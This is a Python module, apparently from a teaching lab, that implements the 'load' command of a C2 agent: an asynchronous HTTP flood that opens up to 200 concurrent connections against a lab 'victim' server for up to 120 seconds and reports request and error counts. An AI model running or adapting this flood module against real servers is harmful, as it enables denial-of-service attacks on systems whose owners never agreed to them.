
"""Carga HTTP controlada (comando load del protocolo C2).

Implementa la inundacion acotada contra el servidor victima del laboratorio:
K conexiones concurrentes durante N segundos, contando solicitudes enviadas
y errores. Solo usa la biblioteca estandar.
"""

import asyncio
import contextlib
import time
import urllib.parse

CONNECT_TIMEOUT = 5.0
MAX_DURATION_S = 120
MAX_CONCURRENCY = 200
MAX_RESPONSE_BYTES = 4096


def _as_int(value, default):
    """Convierte un argumento a entero con valor por defecto."""
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def parse_target(target: str) -> tuple[str, int, str]:
    """Valida el objetivo y devuelve (host, puerto, ruta)."""
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("objetivo invalido: use http://host[:puerto][/ruta]")
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    return host, port, path


def _build_request(host: str, port: int, path: str) -> bytes:
    """Construye una solicitud GET HTTP/1.1 con cierre de conexion."""
    host_header = host if port == 80 else f"{host}:{port}"
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "User-Agent: agenteutn-carga-laboratorio/1.8\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii", errors="ignore")


async def _load_worker(host, port, request, deadline, stats):
    """Envía solicitudes hasta la fecha limite y actualiza el contador."""
    while time.monotonic() < deadline:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=CONNECT_TIMEOUT,
            )
            writer.write(request)
            await writer.drain()
            await asyncio.wait_for(
                reader.read(MAX_RESPONSE_BYTES),
                timeout=CONNECT_TIMEOUT,
            )
            stats["sent"] += 1
        except (OSError, asyncio.TimeoutError):
            stats["errors"] += 1
        finally:
            if writer is not None:
                with contextlib.suppress(Exception):
                    writer.close()


async def run_load(target: str, duration: int, concurrency: int) -> dict:
    """Ejecuta la inundacion y devuelve las estadisticas agregadas."""
    host, port, path = parse_target(target)
    duration = max(1, min(_as_int(duration, 30), MAX_DURATION_S))
    concurrency = max(1, min(_as_int(concurrency, 20), MAX_CONCURRENCY))
    request = _build_request(host, port, path)
    deadline = time.monotonic() + duration
    stats = {"sent": 0, "errors": 0}
    workers = [
        asyncio.create_task(
            _load_worker(host, port, request, deadline, stats)
        )
        for _ in range(concurrency)
    ]
    await asyncio.gather(*workers)
    return {
        "sent": stats["sent"],
        "errors": stats["errors"],
        "duration_s": duration,
        "rps": round(stats["sent"] / duration, 1),
    }
